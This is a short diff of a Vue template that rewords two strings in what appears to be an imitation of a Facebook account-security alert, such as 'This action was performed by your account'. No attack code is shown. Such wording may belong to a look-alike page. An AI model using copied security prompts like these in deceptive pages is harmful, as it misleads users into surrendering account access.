@@ -47,7 +47,7 @@ onMounted(() => {
 
       <div class="max-md:mx-[10px] md:px-5 md:pt-[10px]">
         <p class="text-[12px] my-[10px] max-md:mt-0">
-          {{ $t('This action came from a network you have used before to access Facebook:') }}
+          {{ $t('This action was performed by your account:') }}
         </p>
 
         <p class="text-[12px]">
@@ -58,7 +58,7 @@ onMounted(() => {
         <p class="text-[12px] max-w-[85%] my-[10px]">
           {{
             $t(
-              'If this was not you, you can secure your account. You may need to pass a security challenge, create a new password, and update your account before you can log in.',
+              'If you think someone else is logging into your account, we can help you secure it with a few security steps.',
             )
           }}
         </p>
